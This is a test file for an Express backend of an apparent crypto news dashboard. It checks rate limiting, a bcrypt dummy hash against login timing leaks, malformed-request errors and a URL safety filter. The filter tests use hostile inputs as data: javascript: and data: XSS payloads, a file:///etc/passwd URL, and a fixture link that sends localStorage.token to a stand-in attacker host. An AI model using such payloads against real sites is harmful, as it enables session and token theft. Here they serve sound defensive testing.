import { describe, expect, it, vi } from 'vitest';
import request from 'supertest';
import express from 'express';
import bcrypt from 'bcryptjs';
import { createApp } from '../src/app.js';
import { createLimiter } from '../src/middleware/rateLimit.js';
import { errorHandler } from '../src/middleware/errorHandler.js';
import { isSafeHttpUrl } from '../src/providers/news/url.js';

vi.mock('../src/lib/prisma.js', () => ({
  prisma: {
    $queryRaw: vi.fn().mockResolvedValue([{ '?column?': 1 }]),
    user: { findUnique: vi.fn().mockResolvedValue(null) },
  },
}));

const app = createApp();

describe('rate limiting', () => {
  function limited() {
    const test = express();
    test.get('/thing', createLimiter(60_000, 2, 'Slow down.', () => false), (_req, res) => {
      res.json({ ok: true });
    });
    test.use(errorHandler);
    return test;
  }

  it('allows requests up to the limit and rejects the next one', async () => {
    const test = limited();

    expect((await request(test).get('/thing')).status).toBe(200);
    expect((await request(test).get('/thing')).status).toBe(200);

    const blocked = await request(test).get('/thing');
    expect(blocked.status).toBe(429);
    expect(blocked.body.error.code).toBe('RATE_LIMITED');
    expect(blocked.body.error.message).toBe('Slow down.');
  });

  it('reports the limit in standard headers rather than only failing', async () => {
    const res = await request(limited()).get('/thing');
    expect(res.headers['ratelimit-limit'] ?? res.headers['ratelimit']).toBeDefined();
  });

  it('stands down under test so the suite is not order-dependent', async () => {
    const test = express();
    test.get('/thing', createLimiter(60_000, 1, 'Slow down.'), (_req, res) => {
      res.json({ ok: true });
    });

    for (let i = 0; i < 5; i += 1) {
      expect((await request(test).get('/thing')).status).toBe(200);
    }
  });
});

describe('login timing', () => {
  /**
   * Guards the shape of the constant rather than the timing. A hand-written
   * literal was previously one character short of a valid bcrypt hash, so bcrypt
   * rejected it in well under a millisecond instead of doing the work — the
   * mitigation was present in the code and absent in practice, and response time
   * revealed whether an address was registered. Timing itself is too noisy to
   * assert in CI; the validity of the hash is not.
   */
  it('compares an absent account against a hash bcrypt actually evaluates', async () => {
    const { login } = await import('../src/services/auth.service.js');
    const { prisma } = await import('../src/lib/prisma.js');
    vi.mocked(prisma.user.findUnique).mockResolvedValue(null);

    const compare = vi.spyOn(bcrypt, 'compare');

    await expect(login({ email: 'nobody@example.com', password: 'whatever12' })).rejects.toThrow();

    expect(compare).toHaveBeenCalledTimes(1);
    const hash = compare.mock.calls[0]![1] as string;
    expect(hash).toMatch(/^\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}$/);
    await expect(bcrypt.compare('whatever12', hash)).resolves.toBe(false);

    compare.mockRestore();
  });
});

describe('malformed requests', () => {
  it('reports unparseable JSON as a client error, not a server error', async () => {
    const res = await request(app)
      .post('/api/auth/login')
      .set('Content-Type', 'application/json')
      .send('{"email":');

    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('BAD_REQUEST');
    expect(JSON.stringify(res.body)).not.toMatch(/at .*\(.*:\d+:\d+\)/);
  });

  it('reports an oversize body as 413 rather than 500', async () => {
    const res = await request(app)
      .post('/api/auth/login')
      .set('Content-Type', 'application/json')
      .send(JSON.stringify({ email: 'a@b.co', password: 'x'.repeat(200_000) }));

    expect(res.status).toBe(413);
    expect(res.body.error.code).toBe('PAYLOAD_TOO_LARGE');
  });
});

describe('news link safety', () => {
  it('accepts ordinary article links', () => {
    expect(isSafeHttpUrl('https://cointelegraph.com/news/story')).toBe(true);
    expect(isSafeHttpUrl('http://example.com/a')).toBe(true);
  });

  it('rejects schemes that would execute in the page', () => {
    expect(isSafeHttpUrl('javascript:alert(document.cookie)')).toBe(false);
    expect(isSafeHttpUrl('JavaScript:alert(1)')).toBe(false);
    expect(isSafeHttpUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
    expect(isSafeHttpUrl('vbscript:msgbox(1)')).toBe(false);
    expect(isSafeHttpUrl('file:///etc/passwd')).toBe(false);
  });

  it('rejects anything that is not a URL at all', () => {
    expect(isSafeHttpUrl('')).toBe(false);
    expect(isSafeHttpUrl('not a url')).toBe(false);
    expect(isSafeHttpUrl('//example.com/protocol-relative')).toBe(false);
  });

  // The helper is only worth anything if the pipeline applies it, so this drives
  // a poisoned item through the provider the dashboard actually calls.
  it('drops a poisoned link before it can reach the dashboard payload', async () => {
    const { LayeredNewsProvider } = await import('../src/providers/news/index.js');
    const { buildPersonalizationContext } = await import('../src/services/personalization.js');

    const context = buildPersonalizationContext({
      selectedAssets: ['BTC'],
      investorType: 'HODLER',
      contentPreferences: ['MARKET_NEWS'],
    });

    const cryptoPanic = {
      name: 'cryptopanic',
      configured: true,
      getNews: vi.fn().mockResolvedValue([
        {
          title: 'Bitcoin holds steady',
          url: 'javascript:fetch("//attacker.test?t="+localStorage.token)',
          source: 'Hostile Feed',
          publishedAt: new Date().toISOString(),
          assets: ['BTC'],
        },
        {
          title: 'Bitcoin ETF inflows continue',
          url: 'https://example.com/legitimate',
          source: 'CryptoPanic',
          publishedAt: new Date().toISOString(),
          assets: ['BTC'],
        },
      ]),
    };

    const result = await new LayeredNewsProvider(cryptoPanic as never).getNews(context);

    expect(result.data.map((i) => i.url)).toEqual(['https://example.com/legitimate']);
  });
});
